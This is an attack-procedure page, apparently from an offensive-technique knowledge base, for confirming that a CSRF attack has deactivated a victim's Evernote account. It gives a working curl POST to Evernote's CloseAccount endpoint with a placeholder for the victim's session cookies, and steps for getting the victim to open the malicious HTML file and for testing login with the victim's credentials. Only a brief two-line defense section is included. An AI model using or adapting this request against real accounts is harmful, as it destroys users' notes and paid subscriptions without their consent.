---
tags:
  - deactivation
  - execution
  - csrf-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/evernote-deactivate-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:57.100Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0ae840dc-31ba-454a-99e3-45ce693eeb2b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute Account Deactivation

## Summary

This procedure confirms the success of the CSRF attack by verifying the victim's Evernote account is deactivated following the forged POST request submission.

## Description

Upon file load, the HTML form submits the request using the victim's session, bypassing protections. The endpoint processes it as legitimate, resulting in immediate account closure, loss of notes, and premium subscriptions. Validation involves checking account status post-execution.

## Requirements

1. Victim has opened Csrf.html while logged in
2. Access to monitor account (e.g., via victim report or direct check)
3. Optional: curl to simulate on test account

## Defense

Defensive measures and detection strategies:

- Require 2FA or email confirmation for deactivation
- Audit logs for anomalous POSTs to CloseAccount.action

## Objectives

1. Trigger and complete deactivation
2. Validate impact (access loss)
3. Document for reporting

## Instructions

### Step 1: Monitor Submission

**Context**: The auto-submit happens client-side; no direct control needed.

1. Ask victim to confirm file open
2. Wait ~5 seconds for form submission

> No visible feedback to victim; request hits server silently.

### Step 2: Verify Deactivation

**Context**: Test account access to confirm success.

Attempt login with victim credentials:

1. Go to https://www.evernote.com/Login.action
2. Enter details; expect failure or deactivation message

Or simulate with [[commands/evernote-deactivate-post]] on test:

```bash
curl -X POST 'https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: [victim-session-cookies]' \
  -d 'password=&oneTimeCode=&captchaResponse=&reasons[analytic]=specify-reason-different-app&reasons[i18nKey]=CloseAccountAction.accountActionSurvey.differentApp&reasons[checked]=true&otherReason='
```

> JSON response: {"success":true} or similar; account inaccessible.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/evernote-deactivate-post]]

## Tools Used


## Tags

- deactivation
- execution
- csrf-exploit
